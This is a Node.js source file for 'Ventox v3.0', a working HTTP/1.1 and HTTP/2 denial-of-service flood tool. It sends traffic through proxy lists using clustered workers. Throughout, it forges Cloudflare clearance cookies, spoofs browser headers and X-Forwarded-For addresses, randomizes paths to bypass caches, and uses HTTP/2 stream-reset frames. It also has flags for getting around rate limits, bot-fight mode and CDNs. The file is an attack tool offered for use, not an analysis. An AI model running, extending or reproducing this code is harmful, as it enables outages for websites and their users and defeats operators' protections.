const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const https = require('https');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');
const chalk = require('chalk');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', (e) => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
        console.error(chalk.red(`Uncaught Exception: ${e.message}`));
    })
    .on('unhandledRejection', (e) => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
        console.error(chalk.red(`Unhandled Rejection: ${e.message}`));
    })
    .on('warning', (e) => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
    })
    .on("SIGHUP", () => {})
    .on("SIGCHILD", () => {});

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);
const proxyfile = process.argv[7];
const hello = process.argv.indexOf('--limit');
const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1].toLowerCase() === 'true' : false;
const shit = process.argv.indexOf('--precheck');
const shitty = shit !== -1 && shit + 1 < process.argv.length ? process.argv[shit + 1].toLowerCase() === 'true' : false;
const cdn = process.argv.indexOf('--cdn');
const cdn1 = cdn !== -1 && cdn + 1 < process.argv.length ? process.argv[cdn + 1].toLowerCase() === 'true' : false;
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1].toLowerCase() === 'true' : false;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? true : false;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1].toLowerCase() : "mix";
const debugMode = process.argv.includes('--debug');

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`${chalk.green('                                19 December, 2024')}\n`);
    console.log(`${chalk.blue('Ventox v3.0 || Developers method : @ventox123zz (ventox_cnc) cuto ^^')}`);
    console.log(`${chalk.red('Developers of method: @ventox123zz - recoding method')}\n`);
    console.log(`${chalk.cyan.underline('DESCRIPTION:')}\n`);
    console.log(chalk.red.underline('Usage:'));
    console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --cookie true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full\n`);
    console.error(chalk.yellow(`
    Options:
      --limit true/null - to bypass a little bit ratelimit site Example: --limit true
      --cdn true/null - to bypass cdn/static like web.app firebase namecheapcdn Example: --cdn true
      --precheck true/false: Enable periodic checking mode on the target, Example: --precheck true
      --randpath 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwffw
      --delay <1-100> - delay between requests 1-100 ms (optimal) default 1 ms
      --cookie "f=f" - for custom cookie - also cookie support %RAND% ex: "bypassing=%RAND%"
      --bfm true/null - enable bypass bot fight mode
      --referer https://target.com / rand - use custom referer or random domains ex: fwfwwfwfw.net
      --postdata "username=admin&password=123" - data for POST, format "username=f&password=f"
      --randrate - randomizer rate 1 to 90 good bypass to rate
      --full - attack only big backend ex amazon akamai and others... support cf
      --http 1/2/mix - choose http 1/2/mix (mix 1 & 2)
      --debug - show status code (may reduce rps due to resource usage)
      --header "user-ganet@kontol#referer@https://super.wow" - custom headers
    `));
    process.exit(1);
}

const url = new URL(target);
let proxies = [];
const proxyBlacklist = new Set();
const proxyHealth = new Map();
const requestStats = { success: 0, failed: 0, rateLimited: 0 };
const sessionCookies = new Map();
const connectionPool = new Map();

async function loadProxies() {
    try {
        if (proxyfile.startsWith("http")) {
            const response = await axios.get(proxyfile, { timeout: 5000 });
            proxies = response.data.split(/\r?\n/).filter(Boolean);
        } else {
            proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);
        }
        console.log(chalk.green(`Loaded ${proxies.length} proxies`));
    } catch (error) {
        console.log(chalk.red(`Failed to load proxies: ${error.message}`));
        process.exit(1);
    }
}

async function validateProxy(proxy) {
    const [host, port] = proxy.split(':');
    return new Promise((resolve) => {
        const socket = net.connect({ host, port: parseInt(port) });
        socket.setTimeout(2000);
        socket.on('connect', () => {
            socket.destroy();
            resolve(true);
        });
        socket.on('timeout', () => {
            socket.destroy();
            resolve(false);
        });
        socket.on('error', () => {
            socket.destroy();
            resolve(false);
        });
    });
}

async function getISP(host) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${host}`, { timeout: 5000 });
        if (response.status === 200) {
            console.log(chalk.green(`ISP of ${host}: ${response.data.isp}`));
        }
    } catch (error) {
        console.log(chalk.yellow(`Failed to fetch ISP for ${host}`));
    }
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    return alphabet[Math.floor(Math.random() * alphabet.length)];
};

let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}${randstr(5)}`;
}, 2000);

let hcookie = '';
if (bfmFlag) {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${cc(6, 12)}` : cc(6, 12);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset !== length) return null;
    }
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const error = Buffer.alloc(4);
    error.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, error]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    return Array.from(crypto.randomBytes(length), (byte) => characters[byte % characters.length]).join("");
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    return Array.from(crypto.randomBytes(length), (byte) => characters[byte % characters.length]).join("");
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from(crypto.randomBytes(length), (byte) => characters[byte % characters.length]).join("");
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from(crypto.randomBytes(length), (byte) => characters[byte % characters.length]).join("");
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateUserAgent() {
    const browserNames = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Brave'];
    const browserVersions = Array.from({ length: 20 }, (_, i) => `${getRandomInt(110, 130)}.0.0.0`);
    const operatingSystems = ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64', 'iPhone; CPU iPhone OS 16_0 like Mac OS X'];
    const renderingEngines = ['AppleWebKit/537.36', 'Gecko/20100101'];
    return `${browserNames[Math.floor(Math.random() * browserNames.length)]}/${browserVersions[Math.floor(Math.random() * browserVersions.length)]} (${operatingSystems[Math.floor(Math.random() * operatingSystems.length)]}) ${renderingEngines[Math.floor(Math.random() * renderingEngines.length)]} (KHTML, like Gecko)`;
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 128);
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
    const currentRefererValue = refererValue === 'rand' ? `https://${cc(6, 12)}.net` : refererValue || `https://www.google.com/?q=${randstr(8)}`;
    let headers = `${reqmethod} ${url.pathname}${query ? handleQuery(query) : ''}${postdata ? `?${postdata.replace('%RAND%', randstr(6))}` : ''} HTTP/1.1\r\n` +
        `Host: ${url.hostname}\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        `Accept-Encoding: gzip, deflate, br\r\n` +
        `Accept-Language: ${langValue}\r\n` +
        `Cache-Control: no-cache\r\n` +
        `Connection: Keep-Alive\r\n` +
        `Sec-Fetch-Dest: document\r\n` +
        `Sec-Fetch-Mode: navigate\r\n` +
        `Sec-Fetch-Site: none\r\n` +
        `Sec-Fetch-User: ?1\r\n` +
        `Upgrade-Insecure-Requests: 1\r\n` +
        `User-Agent: ${generateUserAgent()}\r\n` +
        `sec-ch-ua: ${brandValue}\r\n` +
        `sec-ch-ua-mobile: ?0\r\n` +
        `sec-ch-ua-platform: "Windows"\r\n`;
    if (hcookie) headers += `Cookie: ${hcookie}\r\n`;
    if (currentRefererValue) headers += `Referer: ${currentRefererValue}\r\n`;
    if (customHeaders) {
        customHeaders.split('#').forEach(header => {
            const [name, value] = header.split('@').map(part => part?.trim());
            if (name && value) headers += `${name}: ${value}\r\n`;
        });
    }
    return Buffer.from(headers, 'binary');
}

const h1payl = Buffer.concat(new Array(1).fill(buildRequest()));

function weightedProxySelect() {
    const validProxies = proxies.filter(p => !proxyBlacklist.has(p));
    if (!validProxies.length) return null;
    const weights = validProxies.map(p => proxyHealth.get(p)?.weight || 1);
    const totalWeight = weights.reduce((a, b) => a + b, 0);
    let rand = Math.random() * totalWeight;
    for (let i = 0; i < validProxies.length; i++) {
        rand -= weights[i];
        if (rand <= 0) return validProxies[i];
    }
    return validProxies[0];
}

async function go() {
    const proxyAddr = weightedProxySelect();
    if (!proxyAddr) return;
    if (!(await validateProxy(proxyAddr))) {
        proxyBlacklist.add(proxyAddr);
        return;
    }
    const [proxyHost, proxyPort] = proxyAddr.split(':');
    let tlsSocket;
    const poolKey = `${proxyHost}:${proxyPort}`;
    if (connectionPool.has(poolKey) && connectionPool.get(poolKey).net.writable) {
        const { netSocket, tlsSocket: existingTls } = connectionPool.get(poolKey);
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        proceed(netSocket, existingTls);
        return;
    }
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === '1' ? ['http/1.1'] : forceHttp === '2' ? ['h2'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
                sessionIdContext: randstr(32)
            }, () => {
                connectionPool.set(poolKey, { netSocket, tlsSocket });
                proceed(netSocket, tlsSocket);
            }).on('error', () => cleanup('TLS error'));
        });
    }).on('error', () => cleanup('Net error')).on('close', () => cleanup());
    function proceed(netSocket, tlsSocket) {
        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
            if (forceHttp === '2') return cleanup('Forced HTTP/2');
            function mainH1() {
                tlsSocket.write(h1payl, (err) => {
                    if (!err) {
                        requestStats.success++;
                        setTimeout(mainH1, isFull ? 500 : 1000 / (randrate ? getRandomInt(1, 90) : ratelimit));
                    } else {
                        requestStats.failed++;
                        cleanup('H1 write error');
                    }
                });
            }
            mainH1();
            tlsSocket.on('error', () => cleanup('H1 error'));
            return;
        }
        if (forceHttp === '1') return cleanup('Forced HTTP/1.1');
        let streamId = 1;
        let data = Buffer.alloc(0);
        let hpack = new HPACK();
        hpack.setTableSize(4096);
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(custom_update, 0);
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings([
                [1, custom_table + getRandomInt(0, 100)],
                [2, 0],
                [4, custom_window + getRandomInt(0, 1000)],
                [6, custom_header + getRandomInt(0, 100)],
            ])),
            encodeFrame(0, 8, updateWindow)
        ];
        tlsSocket.on('data', (eventData) => {
            data = Buffer.concat([data, eventData]);
            while (data.length >= 9) {
                const frame = decodeFrame(data);
                if (frame) {
                    data = data.subarray(frame.length + 9);
                    if (frame.type === 4 && frame.flags === 0) {
                        tlsSocket.write(encodeFrame(0, 4, "", 1));
                    }
                    if (frame.type === 1) {
                        try {
                            const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                            if (status === '403' || status === '429') {
                                requestStats.rateLimited++;
                                proxyHealth.set(proxyAddr, { ...proxyHealth.get(proxyAddr), count: (proxyHealth.get(proxyAddr)?.count || 0) + 1, backoff: (proxyHealth.get(proxyAddr)?.backoff || 500) * 2 });
                                setTimeout(() => proxyHealth.delete(proxyAddr), proxyHealth.get(proxyAddr).backoff);
                                cleanup('Rate limited');
                            } else if (status >= 200 && status < 300) {
                                requestStats.success++;
                                proxyHealth.set(proxyAddr, { success: (proxyHealth.get(proxyAddr)?.success || 0) + 1, weight: (proxyHealth.get(proxyAddr)?.weight || 1) + 0.5 });
                            } else {
                                requestStats.failed++;
                            }
                            if (debugMode) {
                                statuses[status] = (statuses[status] || 0) + 1;
                            }
                        } catch (e) {
                            requestStats.failed++;
                        }
                    }
                    if (frame.type === 7 || frame.type === 5) {
                        if (frame.type === 7 && debugMode) {
                            statuses["GOAWAY"] = (statuses["GOAWAY"] || 0) + 1;
                        }
                        tlsSocket.write(encodeRstStream(streamId, 8));
                        cleanup('GOAWAY or RST_STREAM');
                    }
                } else {
                    break;
                }
            }
        });
        tlsSocket.write(Buffer.concat(frames));
        function mainH2() {
            if (tlsSocket.destroyed) return;
            const requests = [];
            const customHeadersArray = [];
            if (customHeaders) {
                customHeaders.split('#').forEach(header => {
                    const [name, value] = header.split('@').map(part => part?.trim());
                    if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
                });
            }
            const rate = randrate ? getRandomInt(1, 90) : ratelimit;
            for (let i = 0; i < (isFull ? rate * 10 : rate); i++) {
                const browserVersion = getRandomInt(120, 128);
                const fwfw = ['Google Chrome', 'Brave'];
                const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                const ref = ["same-site", "same-origin", "cross-site"];
                const ref1 = ref[Math.floor(Math.random() * ref.length)];
                const brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
                const isBrave = wfwf === 'Brave';
                const acceptHeaderValue = isBrave
                    ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
                const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
                const sessionId = randstr(16);
                const cookie = sessionCookies.get(sessionId) || hcookie || `session=${randstr(28)}; id=${randstr(20)}`;
                const headers = Object.entries({
                    ":method": reqmethod,
                    ":authority": url.hostname,
                    ":scheme": "https",
                    ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata.replace('%RAND%', randstr(6))}` : ""),
                }).concat(Object.entries({
                    ...(Math.random() < 0.4 && { "cache-control": "no-cache" }),
                    ...(reqmethod === "POST" && { "content-length": "0" }),
                    "sec-ch-ua": brandValue,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": `"Windows"`,
                    "upgrade-insecure-requests": "1",
                    "user-agent": generateUserAgent(),
                    "accept": acceptHeaderValue,
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": langValue,
                    ...(Math.random() < 0.5 && { "sec-fetch-site": refererValue ? ref1 : "none" }),
                    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                    ...(Math.random() < 0.5 && { "cookie": cookie }),
                    ...(Math.random() < 0.5 && { "referer": refererValue === 'rand' ? `https://${cc(6, 12)}.net` : refererValue || `https://www.google.com/?q=${randstr(8)}` }),
                    ...(Math.random() < 0.5 && { "x-forwarded-for": `1${getRandomInt(0, 99)}.${getRandomInt(0, 255)}.${getRandomInt(0, 255)}.${getRandomInt(0, 255)}` }),
                    ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                }).filter(a => a[1] != null));
                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(headers)
                ]);
                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                    const rstStreamFrame = encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
                    requests.push(rstStreamFrame);
                    STREAMID_RESET = 0;
                }
                requests.push(encodeFrame(streamId, 1, packed, flags));
                streamId += 2;
                STREAMID_RESET++;
            }
            tlsSocket.write(Buffer.concat(requests), (err) => {
                if (!err) {
                    requestStats.success += requests.length;
                    setTimeout(mainH2, isFull ? 100 : 1000 / rate);
                } else {
                    requestStats.failed += requests.length;
                    cleanup('H2 write error');
                }
            });
            global.gc && global.gc();
        }
        mainH2();
    }
    function cleanup(error) {
        if (error) requestStats.failed++;
        if (netSocket) netSocket.destroy();
        if (tlsSocket) tlsSocket.end();
        connectionPool.delete(poolKey);
        proxyHealth.set(proxyAddr, {
            success: proxyHealth.get(proxyAddr)?.success || 0,
            failures: (proxyHealth.get(proxyAddr)?.failures || 0) + 1
        });
        if (proxyHealth.get(proxyAddr)?.failures > 1) proxyBlacklist.add(proxyAddr);
        setTimeout(go, 100);
    }
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['bbr', 'cubic', 'reno'];
    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)]} net.ipv4.tcp_sack=1 net.ipv4.tcp_window_scaling=1 net.ipv4.tcp_timestamps=1 net.ipv4.tcp_fastopen=3`;
    exec(command, () => {});
}

function handleQuery(query) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return url.pathname + `?${randomPathSuffix}`;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    }
    return url.pathname;
}

const applu = new https.Agent({ rejectUnauthorized: false });

if (cdn1) {
    const requestHeaders = {
        'Accept': 'text/html',
        'Host': url.hostname,
        'Accept-Language': 'en-US,en;q=0.5',
        'User-Agent': generateUserAgent(),
        'Content-Type': 'application/json',
        'Connection': 'keep-alive',
        'upgrade-insecure-requests': '1',
        'Cache-Control': 'no-cache',
        'sec-ch-ua': `"Google Chrome";v="128", "Not:A-Brand";v="8", "Chromium";v="128"`,
        'accept-encoding': 'gzip, deflate, br',
        'Pragma': 'no-cache'
    };
    const performRequest = async () => {
        try {
            await axios({
                method: reqmethod,
                url: target,
                headers: requestHeaders,
                responseType: 'arraybuffer',
                maxRedirects: 0,
                timeout: 15000,
                httpsAgent: applu
            });
            requestStats.success++;
        } catch (error) {
            requestStats.failed++;
            if (error.response?.status === 429 || error.response?.status === 403) {
                requestStats.rateLimited++;
            }
        }
    };
    const startFlood = async () => {
        const endTime = Date.now() + time * 1000;
        const itb = 1000 / ratelimit;
        while (Date.now() < endTime) {
            const requests33 = [];
            for (let i = 0; i < threads * 2; i++) {
                requests33.push(new Promise(resolve => {
                    setTimeout(() => {
                        performRequest();
                        resolve();
                    }, itb * i);
                }));
            }
            await Promise.all(requests33);
            await new Promise(resolve => setTimeout(resolve, itb * threads));
        }
    };
    startFlood();
}

if (shitty) {
    const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Request timed out')), 5000);
    });
    const axiosPromise = axios.get(target, {
        httpsAgent: applu,
        headers: { 'User-Agent': generateUserAgent() }
    });
    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            console.clear();
            console.log(chalk.cyan('@needmoreloli @@// | ATTACK IS RUNNING'));
            console.log(chalk.green(`> Precheck: ${response.status}`));
        })
        .catch((error) => {
            console.clear();
            console.log(chalk.cyan('@needmoreloli @@// | ATTACK IS RUNNING'));
            console.log(chalk.yellow(`> Precheck: ${error.message}`));
        });
}

if (limit) {
    async function makeRequest(url) {
        while (true) {
            try {
                const response = await axios.get(url, { httpsAgent: applu });
                requestStats.success++;
                return response.data;
            } catch (error) {
                requestStats.failed++;
                if (error.response?.status === 429) {
                    requestStats.rateLimited++;
                    const retryAfter = parseInt(error.response.headers['retry-after']) || 10;
                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                } else {
                    break;
                }
            }
        }
    }
    setInterval(() => makeRequest(target), 500);
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header += getRandomInt(1, 100);
        custom_window += getRandomInt(1, 1000);
        custom_table += getRandomInt(1, 100);
        custom_update += getRandomInt(1, 1000);
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 5000);

if (cluster.isMaster) {
    console.clear();
    console.log(chalk.cyan(`💥 SUPER-POWER VENTOX v3.0 by @ventox123zz - Target: ${target} - Time: ${time}s - Threads: ${threads} - Rate: ${ratelimit}`));
    loadProxies().then(() => getISP(url.hostname));
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(chalk.green(`SENT ATTACK`));
    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    const workers = {};
    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });
    if (debugMode) {
        setInterval(() => {
            let combinedStatuses = {};
            for (let w in workers) {
                if (workers[w][0].state === 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            combinedStatuses[code] = (combinedStatuses[code] || 0) + st[code];
                        }
                    }
                }
            }
            console.clear();
            console.log(chalk.cyan(new Date().toLocaleString('us')));
            console.log(chalk.blue(`Stats: Success: ${requestStats.success}, Failed: ${requestStats.failed}, Rate-Limited: ${requestStats.rateLimited}`));
            console.log(chalk.yellow(`Statuses: ${JSON.stringify(combinedStatuses)}`));
            console.log(chalk.green(`Proxies: Active: ${proxies.length}, Blacklisted: ${proxyBlacklist.size}`));
        }, 1000);
    }
    setInterval(TCP_CHANGES_SERVER, 3000);
    setInterval(async () => {
        proxies = proxies.filter(p => !proxyBlacklist.has(p));
        await loadProxies();
    }, 20000);
    setInterval(() => {
        const cpuUsage = os.loadavg()[0] / os.cpus().length;
        const memUsage = (1 - os.freemem() / os.totalmem()) * 100;
        if (cpuUsage > 0.7 || memUsage > 75) {
            console.log(chalk.red(`[!] High resource usage - CPU: ${cpuUsage.toFixed(2)}, RAM: ${memUsage.toFixed(2)}% - Throttling`));
            for (const id in cluster.workers) cluster.workers[id].kill();
            setTimeout(() => {
                Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
            }, 500);
        }
    }, 1000);
    setTimeout(() => {
        console.log(chalk.green(`Attack completed. Final Stats: Success: ${requestStats.success}, Failed: ${requestStats.failed}, Rate-Limited: ${requestStats.rateLimited}`));
        process.exit(0);
    }, time * 1000);
} else {
    let consssas = 0;
    let someee = setInterval(async () => {
        if (consssas < 50000) {
            consssas++;
            await go();
        } else {
            clearInterval(someee);
        }
    }, delay || 1);
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }
    setTimeout(() => process.exit(0), time * 1000);
}
